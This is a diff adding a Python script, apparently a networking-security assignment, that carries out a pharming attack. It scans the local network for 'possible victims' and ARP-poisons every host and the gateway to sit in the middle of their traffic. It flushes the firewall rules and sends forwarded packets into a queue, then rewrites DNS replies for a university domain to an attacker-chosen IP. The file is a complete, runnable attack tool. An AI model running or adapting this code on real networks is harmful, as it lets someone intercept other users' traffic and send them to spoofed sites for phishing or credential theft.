@@ -1,0 +1,125 @@
+#!/usr/bin/env python3
+from scapy.all import Ether, ARP, srp, send, IP, UDP, DNS, DNSRR, DNSQR
+from netfilterqueue import NetfilterQueue
+from sys import exit
+from os import system, geteuid
+import netifaces as ni
+import time
+
+# default IPv4 gateway: ('192.168.64.1', 'enp0s6')
+gateway = ni.gateways()['default'][ni.AF_INET]
+
+# initialize parameters
+AP_ip, AP_mac = gateway[0], None
+interface = gateway[1]
+possible_victims = {}
+
+# calculate CIDR (Classless Inter-Domain Routing)
+netmask = ni.ifaddresses(interface)[ni.AF_INET][0]['netmask'] # 255.255.255.0
+length = sum(bin(int(i)).count('1') for i in netmask.split('.')) # 24
+cidr = AP_ip + '/' + str(length) # 192.168.64.1/24
+
+def list_devices():
+    """
+    Conducting ARP ping with the Scapy library to discover hosts on a local ethernet network 
+    and list out the IP and mac addresses of neighbor devices (except AP and attacker).
+    """
+    # ARP ping to discover hosts on a local ethernet network
+    results = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=cidr), timeout=3, verbose=0)[0]
+
+    # parse the response to get IP and MAC addresses
+    for _sent, recv in results:
+        if recv.psrc != AP_ip:
+            possible_victims[recv.psrc] = recv.hwsrc # ip : mac
+        else: 
+            global AP_mac
+            AP_mac = recv.hwsrc
+
+    # print the results
+    print("Available devices")
+    print('-------------------------------------')
+    print('IP Address          MAC Address      ')
+    print('-------------------------------------')
+    for ip, mac in possible_victims.items(): 
+        print('{:20}{}'.format(ip, mac))
+    print('-------------------------------------')
+
+
+def arp_spoofing():
+    """
+    Sending spoofed ARP packets to all neighbors (possible victims) to trick AP we are the victim 
+    and trick the victim we are AP via exchanging MAC addresses with the Scapy library.
+    """
+    for ip, mac in possible_victims.items():
+        # replace the victim's MAC address in AP's arp cache with the attacker's
+        arp_to_AP = ARP(hwdst=AP_mac, pdst=AP_ip, psrc=ip, op='is-at')
+        send(arp_to_AP, verbose=False)
+        # replace AP's MAC address in the victim's arp cache with the attacker's
+        arp_to_victim = ARP(hwdst=mac, pdst=ip, psrc=AP_ip, op='is-at')
+        send(arp_to_victim, verbose=False)
+
+    time.sleep(2)
+
+def dns_spoofing(pkt):
+    """
+    Perform DNS spoofing with netfilterqueue and Scapy. 
+    Modify the packet if it is a DNS reply and the qname = target website.
+    """
+    # convert netfilter queue packet to scapy packet
+    scapy_pkt = IP(pkt.get_payload())
+    try:
+        # check if the packet is DNS reply (DNS Resource Record) and its qname
+        if scapy_pkt.haslayer(DNSRR) and scapy_pkt[DNSQR].qname == b'www.nycu.edu.tw.':
+            # modify DNS reply packet
+            scapy_pkt[DNS].an = DNSRR(rrname=b'www.nycu.edu.tw.', rdata='140.113.207.241')
+            scapy_pkt[DNS].ancount = 1
+            # delete checksums and length of the packet, the values will then be calculated automatically by Scapy
+            del scapy_pkt[IP].len
+            del scapy_pkt[IP].chksum
+            del scapy_pkt[UDP].len
+            del scapy_pkt[UDP].chksum
+            # convert back to netfilter queue packet
+            pkt.set_payload(bytes(scapy_pkt))
+    except IndexError:
+        # handle IPerror / UDPerror
+        pass
+    # send to packet out
+    pkt.accept()
+
+def restore_arp():
+    """
+    Restoring AP's MAC address on all neighbors' ARP table via sending ARP packets.
+    """
+    print("\n[!] CTRL+C detected ! Stop pharming ... ")
+    print("Restoring the ARP cache ...")
+    for ip, mac in possible_victims.items():
+        # telling the victim AP's original mac address
+        arp_to_victim = ARP(hwdst=mac, hwsrc=AP_mac, pdst=ip, psrc=AP_ip, op='is-at')
+        send(arp_to_victim, verbose=False, count=7)
+
+if __name__ == '__main__':
+    # check user permission
+    if geteuid(): 
+        exit('Usage: sudo ./pharm_attack')
+
+    # task 1
+    list_devices()
+    # task 2
+    arp_spoofing()
+    
+    # task 4
+    QUEUE_NUM = 0
+    # insert the iptables FORWARD rule
+    system("iptables -F")
+    system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
+    queue = NetfilterQueue()
+
+    print('Start pharming ...')
+    try:
+        queue.bind(QUEUE_NUM, dns_spoofing)
+        queue.run()
+        # keep sending arp spoofing packet
+        while True:
+            arp_spoofing()
+    except KeyboardInterrupt:
+        restore_arp()
